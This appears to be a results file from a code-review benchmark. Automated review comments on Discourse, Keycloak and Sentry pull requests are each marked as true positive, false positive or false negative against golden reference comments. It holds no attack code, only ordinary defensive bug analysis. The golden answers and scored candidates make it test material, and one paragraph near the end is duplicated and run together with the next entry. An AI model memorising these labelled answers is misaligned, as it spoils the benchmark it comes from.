`.small-action` is now `display: flex`, which makes `float` on its direct children a no-op. The `button { float: right; }` rule at the end of the block (and `.topic-avatar { float: left; }`) therefore no longer have any effect: the small-action button will be laid out immediately after `.small-action-desc` instead of being pushed to the right edge of the post, because `.small-action-desc` has no `flex: 1`/`flex-grow` and the button has no `margin-left: auto`. The existing `clear: both` on the flex container is likewise dead. Add `margin-left: auto` to the button (or `flex: 1` to `.small-action-desc`) and remove the now-meaningless float/clear declarations.

align-items() forwards modern keywords to legacy properties that do not accept them

`align-items($alignment)` passes `$alignment` verbatim to `-webkit-box-align` and `-ms-flex-align`. Those legacy properties only accept `start | end | center | baseline | stretch`, so the very common modern values `flex-start` and `flex-end` will produce invalid declarations that are silently dropped, leaving legacy engines (which are precisely the ones receiving `display: -webkit-box` / `-ms-flexbox` from the new `flexbox()` mixin) with the default `stretch` alignment. The current call sites only use `center` and `baseline`, so the bug is latent, but as a shared mixin it will break the first time someone writes `@include align-items(flex-start)`. The mixin should translate `flex-start`/`flex-end` to `start`/`end` for the legacy properties.

align-items() has no -moz-box-align although flexbox() emits display: -moz-box

`flexbox()` and `inline-flex()` emit `display: -moz-box` / `-moz-inline-box` for old Gecko, and `order()` emits `-moz-box-ordinal-group`, but `align-items()` omits `-moz-box-align`. Old Firefox versions therefore get legacy box layout with no cross-axis alignment at all (default stretch), which is exactly the case the prefix fallback was added for: e.g. `.d-header .contents` and `.small-action` will render with stretched, non-centered children instead of the intended vertical centering. Either add `-moz-box-align` or drop the `-moz-box` display fallbacks so the prefix coverage is internally consistent.

true_positives.golden_comment: The include_website_name method is missing the required ? suffix. Rails serializers expect include_ methods to end with ? for conditional attribute inclusion, a convention followed by other methods in this serializer. Without it, the website_name attribute may not be conditionally included as intended. Additionally, the '.' << website_host string concatenation should be replaced with '.' + website_host or '.#{website_host}' to avoid mutating string literals, which can lead to issues.
true_positives.matched_candidate:
`include_website_name` is missing the trailing `?` so the guard never runs

ActiveModel::Serializers looks for a predicate named `include_<attribute>?`. The method is defined as `include_website_name` (no question mark), so it is dead code and `website_name` is unconditionally serialized. Consequences: (1) the key `website_name` is emitted with a `nil` value for every user that has no website, bloating every user payload and breaking any consumer that checks for key presence; (2) the intended `website.present?` gating is silently not applied. Rename to `include_website_name?`.

false_positives.candidate:
Domain-matching heuristic mis-handles `www.` hosts and false-positives on shared public suffixes

The branch logic only compares hosts when the label counts are equal and > 2. Consequences: (a) website `http://www.example.com/user` on an instance hosted at `example.com` falls through to the `else` branch, where `"example.com".ends_with?(".www.example.com")` is false, so the path is dropped even though it is the same site — exactly the case this PR is meant to handle; (b) hosts sharing only a public suffix, e.g. website `foo.blogspot.com` with instance `bar.blogspot.com`, compare equal on the last two labels and get the full path rendered even though they are unrelated sites. Consider normalising a leading `www.` and comparing registrable domains instead of raw label suffixes.

No spec covers `website_name` visibility, so the untrusted/include regressions are undetected

The TL0-seen-as-anonymous context enumerates `untrusted_attributes` but does not include `website_name`, so the fact that the new attribute leaks a restricted website is not caught. There is likewise no spec for a user with a blank website (which currently serialises `website_name: nil` because the include predicate is misnamed `include_website_name`), nor for the sibling-subdomain branch (`www.example.com` website with `forum.example.com` instance). Add specs for these three cases so the guards are actually exercised.

`"." << website_host` mutates a string literal

`discourse_host.ends_with?("." << website_host)` uses destructive append on the literal `"."`. It happens to work today because each evaluation allocates a fresh literal, but it will raise `FrozenError` the moment this file gets `# frozen_string_literal: true` (or the interpreter is run with frozen literals enabled), and it is needlessly allocating/mutating. Use `".#{website_host}"` or `"." + website_host`.

`website_name` is not listed in `untrusted_attributes`, leaking a TL0 user's website to anonymous visitors

`website` is declared in `untrusted_attributes` so that, when `scope.restrict_user_fields?(object)` is true (TL0 user viewed anonymously), the URL is not exposed — this is an anti-spam/privacy measure. The new `website_name` attribute returns the website host (and, for same-domain sites, the full path) but is not added to `untrusted_attributes`, and its own include guard (see `include_website_name`) only checks `website.present?`. The restricted URL is therefore disclosed through `website_name`, defeating the existing restriction. Add `:website_name` to the `untrusted_attributes` list (or make the include predicate also honour `scope.restrict_user_fields?`).

`addMembers` and `removeMember` only attach a success handler (`.then(function(){ self.findMembers(); })`) and the calling controller actions (`addMembers`, `removeMember` in admin-group.js.es6) ignore the returned promise. If the request fails - e.g. the 422 `can_not_modify_automatic` response, a validation error, or any 500 - nothing is displayed and the member list is not refreshed, so the admin believes the operation succeeded. Note the server also silently ignores unknown usernames in `add_members`, which compounds the lack of feedback. A failure handler showing `bootbox.alert` (as `save`/`destroy` do) is needed.

add_members assumes the usernames param is a String

`usernames = params.require(:usernames)` followed by `usernames.split(",")` raises `NoMethodError` (500) if a client sends `usernames[]=a&usernames[]=b`, which is a natural way to call this endpoint and is what Rails produces for an array parameter. Accept both forms (e.g. `Array(usernames).flat_map { |u| u.to_s.split(',') }`) or validate the type and return a 400.

create silently drops alias_level sent by the client

`Discourse.Group#asJSON` (app/assets/javascripts/discourse/models/group.js) always includes `alias_level`, and `create` POSTs that payload, but `Admin::GroupsController#create` only assigns `name` and `visible`. An admin who picks an alias level while creating a new group has that choice silently discarded (the server keeps the default), while the client model still shows the chosen value, so the UI and database disagree until the next save. `update` handles `alias_level`; `create` should too.

members endpoint does not validate limit/offset, allowing 500s and unbounded queries

`limit = (params[:limit] || 50).to_i` and `offset = params[:offset].to_i` are used directly in `limit(limit).offset(offset)` on a publicly reachable endpoint. A negative value (`?offset=-1` or `?limit=-1`) produces `OFFSET -1` / `LIMIT -1`, which PostgreSQL rejects ("OFFSET must not be negative"), turning user input into a 500 error. A huge value (`?limit=1000000`) makes the server load and serialize every group member in one request, an easy resource-exhaustion vector. Both parameters should be clamped (e.g. limit between 1 and some max, offset >= 0).

remove_member raises RecordNotFound (500) when user_id is not a member of the group

`group.users.delete(params.require(:user_id).to_i)` passes an Integer to the collection proxy, which internally calls `find` scoped to the association. If the id does not belong to the group (already removed, bogus id, double-click on the remove button, or `to_i` turning a non-numeric value into 0), `ActiveRecord::RecordNotFound` is raised and the admin gets an unhandled error instead of a graceful response. The action should look the user up explicitly and no-op / return a proper error when the user is not a member.

remove_member uses group.users.delete, bypassing GroupUser callbacks and the user_count counter cache

`remove_member` deletes the membership with `group.users.delete(user_id)`. For a `has_many :through` association with no `:dependent` option, Rails deletes the join rows with `delete_all`, so no `GroupUser` destroy callbacks run and the `counter_cache: "user_count"` on `GroupUser#group` is never decremented. Consequences: the `user_count` column (rendered by `BasicGroupSerializer` and shown in the admin group list and `userCountDisplay`) stays stale/too high forever, and the per-membership cleanup normally done on destroy (e.g. clearing a granted group title / primary group) is skipped. The existing `Group#remove(user)` helper (which destroys the `GroupUser` record) should be used instead.

true_positives.golden_comment: The @loaded_locales instance variable in translate_accelerator.rb is lazily initialized and accessed by multiple concurrent threads without synchronization.
true_positives.matched_candidate:
`ensure_loaded!` initializes and reads @loaded_locales outside LOAD_MUTEX

`ensure_loaded!` does `@loaded_locales ||= []` and `@loaded_locales.include?(locale)` without holding `LOAD_MUTEX`, while `load_locale` appends to the same array under the mutex and `reload!` replaces it. Two request threads entering `ensure_loaded!` concurrently when `@loaded_locales` is nil can each create a separate array, so one thread's bookkeeping is discarded and locale files are parsed again (and, combined with `reload!`, a thread can observe a partially replaced list). The consequence is redundant, expensive YAML loading rather than corruption, but the initialization belongs inside the mutex (or `@loaded_locales` should be initialized eagerly at load time).

false_negatives.golden_comment: Consider normalizing the input locale (e.g., to a symbol) when checking/loading here to avoid double-loading if the same locale is passed as a String vs Symbol (also applies to other locations in the PR).

false_positives.candidate:
Fallback chain calls SiteSetting on every lookup and raises if default_locale is nil / DB unavailable

`FallbackLocaleList#[]` executes `SiteSetting.default_locale.to_sym` on every fallback resolution. Two concrete problems: (1) if `SiteSetting.default_locale` is nil or site settings are not usable yet, `nil.to_sym` raises `NoMethodError` from deep inside an `I18n.t` call - this happens in contexts where I18n is used but the database/site_settings are not available (e.g. `rake assets:precompile` on a machine without a DB, early boot, migrations), turning a harmless missing translation into a crash. The trailing `.compact` does not protect against this because `to_sym` is evaluated first; it only guards a nil `locale` argument. (2) `[]` is on the hot path of every missing-translation lookup and allocates a new array plus performs a site-setting read each time, even though `FallbackLocaleList` inherits from `Hash` and never memoizes (unlike `I18n::Locale::Fallbacks`, which caches the computed chain). Consider rescuing/guarding the setting lookup and memoizing per locale+default_locale.

Fallback locales are only loaded for web requests; missing translations get cached permanently

Because of the lazy-loading freedom patch, `I18n.translate` only calls `load_locale(config.locale)` for the *current* locale; translations for the other locales in the fallback chain are loaded exclusively by `FallbackLocaleList#ensure_loaded!`, which is only invoked from `ApplicationController#set_locale`. Any code path that is not an HTTP request through ApplicationController - Sidekiq jobs, mailers rendered from jobs, rake tasks, the console, `I18n.with_locale` blocks - will have an unloaded fallback locale, so `I18n::Backend::Fallbacks` finds nothing and the lookup resolves to the "translation missing" string instead of the site default/English text. Worse, `I18n.translate` caches that result in the LRU cache (`@cache.getset(k) { translate_no_cache(key).freeze }`) and `ensure_loaded!` does not clear the cache, so once a key is resolved while the fallback locale was unloaded, the "translation missing" text keeps being returned for web requests too until the entry is evicted or the process restarts. Loading should be hooked into `load_locale`/`translate` (or the cache invalidated when a new locale is loaded) rather than relying on a controller filter.

No tests for the new fallback behaviour, which is now enabled in all environments

This PR moves fallbacks from `config.i18n.fallbacks = true` (previously only production/profile) to an initializer that is loaded in every environment, including test and development, and introduces a custom three-step chain (user locale -> site default -> :en) plus a new `I18n.ensure_loaded!`. No spec is added for any of it: there is no coverage that a key missing in the user locale resolves to the site default and then to English, that `FallbackLocaleList#ensure_loaded!` actually loads the locale files it returns, or that `I18n::Backend::Pluralization` is still applied after `config/initializers/pluralization.rb` was deleted. Since fallbacks now also apply in the test environment, existing specs that rely on missing-translation behaviour can silently change meaning without any new test asserting the intended semantics.

Translation LRU cache key does not include the fallback chain (multisite cross-site leakage)

The memoized translation cache key is `"#{key}#{config.locale}#{config.backend.object_id}"`. With this PR the fallback chain is no longer a static `[locale, :en]`; it is `[locale, SiteSetting.default_locale.to_sym, :en]` (config/initializers/i18n.rb), i.e. it now depends on a per-site setting. Because the cache key does not contain `SiteSetting.default_locale`, a value resolved through the fallback chain on one site is served to every other site in the same process. Example: site A has `default_locale = de`, a user with locale `fr` triggers a lookup of a key missing in `fr`; the German string is resolved and cached under key `"...fr<backend_id>"`. A subsequent request on site B (`default_locale = en`) for the same key in `fr` gets a cache hit and is shown the German string. The same staleness occurs on a single site whenever an admin changes `default_locale` without an `I18n.reload!`/cache flush. Previously the chain fell back to the global `I18n.default_locale`, so the cache was site-independent and this could not happen.

true_positives.golden_comment: In UsernameForm.authenticate(), isConditionalPasskeysEnabled() is called without passing the required UserModel parameter.
true_positives.matched_candidate:
Call to non-existent no-arg isConditionalPasskeysEnabled() does not compile

`UsernameForm.authenticate()` calls `isConditionalPasskeysEnabled()` with no arguments, but the only method added in this PR is `UsernamePasswordForm.isConditionalPasskeysEnabled(UserModel user)` (UsernamePasswordForm.java:160), and no no-arg overload exists in the super-class hierarchy (`UsernamePasswordForm` -> `AbstractUsernameFormAuthenticator` -> `AbstractFormAuthenticator`). As written this is a compilation error and the `services` module (and therefore the whole build) will not compile. Either add the no-arg overload or pass `context.getUser()`.

true_positives.golden_comment: With isConditionalPasskeysEnabled(UserModel user) requiring user != null, authenticate(...) will not call webauthnAuth.fillContextForm(context) on the initial login page where context.getUser() is still null, so conditional passkey UI will not be set up for first-time passkey login. Consider whether this should also be enabled when no user has been selected yet so ID-less passkey authentication on the initial login form continues to work.
true_positives.matched_candidate:
isConditionalPasskeysEnabled requires user != null, disabling passkeys on the normal login page

`isConditionalPasskeysEnabled(UserModel user)` returns true only when `user != null`. Both call sites use it to decide whether to call `webauthnAuth.fillContextForm(context)`: `authenticate()` (line 115) and the error `challenge(context, error, field)` override (line 137). Before this change the condition was exactly the opposite (`context.getUser() == null && webauthnAuth.isPasskeysEnabled()`), i.e. the webauthn/conditional-UI data was filled when the user had not yet been identified. `fillContextForm` is what sets the challenge auth note and the `enableWebAuthnConditionalUI`/challenge/rpId form attributes that the login template needs to render the `webauth` form and start conditional mediation. With the new condition, a first-time visitor (user == null) no longer gets any of that, so the primary ID-less passkey login (auto-login with a discoverable key, 'Sign in with passkey' link, passkey autofill on the username/password page) is silently removed, and the same happens on the error re-render after a bad username/password. Existing tests in all three Passkeys* test classes assert the presence of `//form[@id='webauth']` on the initial login page and auto-login with a discoverable key, so they will fail. The condition most likely needs to be 'passkeys enabled AND (user == null OR user has a passwordless webauthn credential)'.

false_positives.candidate:
Overly broad try/catch(Exception) used to assert element absence

The blocks at lines 291-296 and 312-317 call `driver.findElement(...)` inside `try { ...; fail(...); } catch (Exception nsee) { /* expected */ }`. Catching `Exception` swallows any WebDriver failure (e.g. TimeoutException, StaleElementReferenceException, WebDriverException from a broken page), so the assertion can pass for a completely unrelated reason and hide a real regression. The rest of the suite uses `Assert.assertThrows(NoSuchElementException.class, () -> driver.findElement(...))`; use that here so only the expected exception type satisfies the assertion.

Overriding shouldShowWebAuthnAuthenticators() to false removes the 'user has no passkey' guard during re-authentication

`WebAuthnAuthenticator.fillContextForm()` used the `user != null` branch not only to publish `ALLOWED_AUTHENTICATORS`, but also to bail out (`return null`) when the identified user has no credential of the relevant type. By overriding `shouldShowWebAuthnAuthenticators()` to always return `false` in the conditional-UI authenticator, that branch is never taken, so during re-authentication (where the user is already known) the passkey/conditional-UI markup is now injected unconditionally for every user in a passkeys-enabled realm, including users that have no passwordless WebAuthn credential at all. Combined with the `UsernameForm` change (which no longer skips the username form during re-authentication when passkeys are enabled), such users get an extra, useless screen with a passkey prompt, and any passkey they pick from the platform list that belongs to another account ends in a WEBAUTHN_ERROR_DIFFERENT_USER error page. A check that the already-identified user actually has the passwordless credential configured is needed before enabling the conditional UI.

reauthenticationOfUserWithoutPasskey does not test a user without a passkey

The test name and the inline comment at line 304 ('Passkeys login should not be available on the page as this user does not have passkey') claim it covers re-authentication of a user that has no passkey, but the test sets `setWebAuthnPolicyPasskeysEnabled(Boolean.FALSE)`, i.e. passkeys are disabled for the whole realm. The absence of the `webauth` form therefore proves nothing about per-user credentials. The actually interesting (and currently unverified) scenario introduced by this PR - passkeys enabled for the realm, user already identified for re-authentication but owning no passwordless WebAuthn credential - remains untested, which is exactly the path where the conditional UI is now shown unnecessarily. Either rename/retarget this test or add a second test with passkeys enabled and a user without a passkey credential.

true_positives.golden_comment: The OptimizedCursorPaginator in organization_auditlogs.py attempts to use negative slice offsets on Django querysets, but Django querysets do not support negative slicing and will raise an AssertionError.
true_positives.matched_candidate:
Negative queryset slicing raises ValueError; the "Django handles it" comment is wrong

In `OptimizedCursorPaginator.get_result`, when `enable_advanced_features` is set and `cursor.offset < 0`, the code does `queryset[start_offset:stop]` with a negative `start_offset` (and often a negative `stop`, since `stop = start_offset + limit + extra`). Django's `QuerySet.__getitem__` explicitly rejects negative start/stop values with `ValueError("Negative indexing is not supported.")`; there is no SQL equivalent of a negative OFFSET. So the inline comment "The underlying Django ORM properly handles negative slicing automatically" is factually false, and any request carrying a cursor with a negative offset on this path returns an unhandled 500. Since cursor strings are fully client-controlled (`Cursor.from_string` accepts negative offsets), this is a trivially reachable error/DoS vector. The whole negative-offset branch should be removed, or negative offsets rejected with `BadPaginationError`.

true_positives.golden_comment: When requests are authenticated with API keys or org auth tokens (which have user_id=None), organization_context.member is None. Line 71 attempts to access organization_context.member.has_global_access without checking if member is None, causing an AttributeError crash when optimized_pagination=true is used, even though the request passed all permission checks with valid org:write scope.
true_positives.matched_candidate:
`organization_context.member` can be None, causing AttributeError on every request

`enable_advanced = request.user.is_superuser or organization_context.member.has_global_access` is evaluated unconditionally for every GET, before the `use_optimized` check. `RpcUserOrganizationContext.member` is `None` whenever the caller is not an organization member — e.g. requests authenticated with an org-level/integration token (where `request.user` is an AnonymousUser and `is_superuser` is False), or a staff/superuser-less service account. In those cases the short-circuit does not fire and `None.has_global_access` raises `AttributeError`, turning a previously working audit-log listing into an unhandled 500. Guard with `organization_context.member and organization_context.member.has_global_access`, and only compute the flag when `use_optimized` is true.

true_positives.golden_comment: get_item_key assumes a numeric key, but the paginator is used with order_by=-datetime in the audit logs endpoint; calling math.floor/ceil on a datetime will raise a TypeError.
true_positives.matched_candidate:
OptimizedCursorPaginator cannot handle datetime sort keys, which is what the audit-log endpoint uses

`OptimizedCursorPaginator.get_item_key` does `int(math.floor(getattr(item, self.key)))` and `value_from_cursor` returns `cursor.value` unchanged — i.e. it copies `Paginator`'s numeric-key semantics. The only caller, `OrganizationAuditLogsEndpoint`, instantiates it with `order_by="-datetime"` on `AuditLogEntry`, whose `datetime` field is a `datetime` object: `math.floor(datetime)` raises `TypeError: must be real number, not datetime`. Even if the first page somehow succeeded, `value_from_cursor` would hand an integer to `build_queryset`, which injects it into `WHERE "datetime" <= %s` against a timestamp column, producing a database error. The optimized path therefore fails for every request that reaches it; it needs `DateTimePaginator`-style key/value conversion (or should subclass `DateTimePaginator`).

false_negatives.golden_comment: Importing non-existent OptimizedCursorPaginator

false_positives.candidate:
Authorization gate does not restrict the feature to administrators

The comment says the new pagination path is for "authorized administrators", but the check is `request.user.is_superuser or organization_context.member.has_global_access`. Two problems: (1) `request.user.is_superuser` is the raw DB flag; Sentry requires `is_active_superuser(request)` (or the staff equivalent) so that superuser powers only apply within an elevated/validated superuser session — using the raw flag bypasses that elevation requirement; (2) `member.has_global_access` is not an admin signal at all: it is true for ordinary members in organizations with open membership / global access, so essentially any regular org member can turn on the "admin-only" code path by appending `?optimized_pagination=true`. The gate should use an explicit permission/scope check.

BasePaginator silently clamps negative forward offsets, changing behavior for every paginated endpoint

`start_offset = max(0, offset) if not cursor.is_prev else offset` changes the shared `BasePaginator.get_result` used by most paginated Sentry endpoints: a forward cursor with a negative offset, which previously surfaced as an error from Django slicing, now silently returns the first page's rows. That masks malformed/tampered cursors and can produce duplicated results across pages. Note also that the clamp is deliberately not applied when `cursor.is_prev`, so the previous-page path still crashes with `ValueError: Negative indexing is not supported.` — the stated justification ("the underlying queryset will handle boundary conditions") is incorrect. Invalid offsets should raise `BadPaginationError` consistently for both directions.

Comment documents a non-existent feature of Cursor

The added comment claims "Performance optimization: Allow negative offsets for advanced pagination scenarios", but no code changed here — `int(offset)` has always accepted any integer and nothing validates or makes use of negative offsets. The comment asserts that negative offsets are a supported, intentional capability, which is false: every consumer eventually feeds the offset into a Django queryset slice, which rejects negative values. This will mislead future readers into producing negative-offset cursors. Remove the comment or, better, add explicit validation that rejects negative offsets.

Cursors are not interchangeable between the two paginators selected by a query param

The endpoint switches between `DateTimePaginator` (cursor value = epoch milliseconds) and `OptimizedCursorPaginator` (cursor value = floor/ceil of the raw sort value) based on the client-supplied `optimized_pagination` flag. A cursor minted by one paginator is meaningless to the other, so a client that follows a `Link` header while the flag changes (or that caches cursors) will get wrong pages, skipped/duplicated rows, or a query error. Pagination state must not depend on a mutable request flag; pick one cursor encoding or namespace the cursors.

No tests for the new paginator or the new endpoint branch

`OptimizedCursorPaginator` (including its negative-offset branch) and the new `optimized_pagination` branch in `OrganizationAuditLogsEndpoint` ship with no tests, and the behavior change in `BasePaginator.get_result` (offset clamping) is likewise untested. Basic tests would have caught the `math.floor(datetime)` TypeError, the negative-slice `ValueError`, and the `organization_context.member is None` AttributeError. Add paginator unit tests for negative/zero/positive offsets plus endpoint tests covering member, non-member-token and superuser callers.

true_positives.golden_comment: OptimizedCursorPaginator's negative-offset branch in get_result() passes cursor.offset directly as start_offset to queryset slicing when enable_advanced_features is True and cursor.offset < 0.
true_positives.matched_candidate:
Negative, user-controlled cursor offsets are passed straight into a Django queryset slice

When `enable_advanced_features` is set, a cursor with `offset < 0` (cursors come from the untrusted `?cursor=` query parameter via `Cursor.from_string`, which accepts negative integers) is used as the slice start: `queryset[start_offset:stop]` with `start_offset` negative. Django raises `ValueError: Negative indexing is not supported.` on querysets, which is not caught by `Endpoint.paginate` (only `BadPaginationError` becomes a 400), so any request with a negative cursor offset returns an unhandled 500. The in-code justification ("the underlying Django ORM properly handles negative slicing automatically", "permissions are checked at the queryset level") is incorrect, and it deliberately removes the negative-offset guard (`BadPaginationError("Pagination offset cannot be negative")`) that every other paginator in this module enforces. Negative offsets should be rejected, not forwarded.

true_positives.golden_comment: In BasePaginator.get_result(), when cursor.is_prev is True, it sets start_offset = offset without clamping, allowing negative offset values to be passed to queryset slicing.

When `enable_advanced_features` is set, a cursor with `offset < 0` (cursors come from the untrusted `?cursor=` query parameter via `Cursor.from_string`, which accepts negative integers) is used as the slice start: `queryset[start_offset:stop]` with `start_offset` negative. true_positives.golden_comment: OptimizedCursorPaginator.get_item_key uses floor/ceil on a datetime key (order_by='-datetime'), causing TypeError.
true_positives.matched_candidate:
OptimizedCursorPaginator's item key/cursor conversion is numeric-only and breaks the audit log's `-datetime` ordering

`OptimizedCursorPaginator.get_item_key` does `int(math.floor(getattr(item, self.key)))` and `value_from_cursor` returns `cursor.value` verbatim. The only caller (`organization_auditlogs.py`, `order_by="-datetime"`) sorts on a `DateTimeField`, so `math.floor(datetime)` raises `TypeError`, producing a 500 as soon as the optimized path is taken.
